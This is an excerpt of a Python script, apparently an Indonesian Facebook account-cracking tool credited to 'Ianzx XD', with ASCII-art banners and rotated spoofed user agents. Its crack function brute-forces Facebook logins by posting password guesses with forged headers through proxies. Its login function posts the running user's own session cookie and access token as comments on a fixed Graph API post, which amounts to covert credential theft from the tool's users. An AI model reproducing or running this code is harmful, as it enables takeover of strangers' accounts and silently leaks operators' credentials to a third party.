...
author = 'Ianzx XD'
git_hub = 'github.com/IanzxXD'
faceb0ok = 'Riansyah Voldigoad'
...
{H}█▀▀ █▀█ ▄▀█ █▀▀ █▄▀   █ █▀▄
█▄▄ █▀▄ █▀█ █▄▄ █░█   █ █▄▀
   {M}•{K}•{H}• {P}Author: Ianzx Ft Toska{H}•{K}•{M}•""")
def logo2():
	return str(f"""
{H}█▀▀ █▀█ ▄▀█ █▀▀ █▄▀   █ █▀▄
█▄▄ █▀▄ █▀█ █▄▄ █░█   █ █▄▀
...
for xd in range(1000):
    ...
    ugent1 = f"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba"
    ugent2 = f"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba"
    ugent3 = f"https://developers.whatismybrowser.com/useragents/parse/264014-samsung-browser-linux-smart-tv-webkit"
...
def login():
	...
	try:
		...
		tem      = ('\nKeren lu ngab@[100080448395744:] & @[100001166323617:]\n\nJangan lupa ngocox,rian keren pokonya\n')
		slebew = ('\nIanzx XD The Best Komentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100080448395744/posts/pfbid0iKYbYTr7sSy6stP7jRvpeAxbvGwvagpeM7JUF5nqv7QXU2vyudJ7zGS1LB2NV8qTl/?app=fbl')
		...
		ses.post(f"https://graph.facebook.com/172593228765623/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/172593228765623/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/172593228765623/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=fx_reauth&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100&locale=ha_NG&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1)[0],"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1)[0],"uid":idf,"next":"https://m.facebook.com/fxauth/?app_id=1217981644879628&amp;etoken=Abj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ&amp;extra_data=%2Fadd%2F%3Fbackground_page%3D%252Fconnected_experiences%252Fcross_posting%252F&amp;native_app_login_flow=fbcalcomettest","flow":"fx_reauth","pass":pw}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','content-length':f'{len(str(dataa))}','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=fx_reauth&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100&locale=ha_NG&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=ha_NG',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
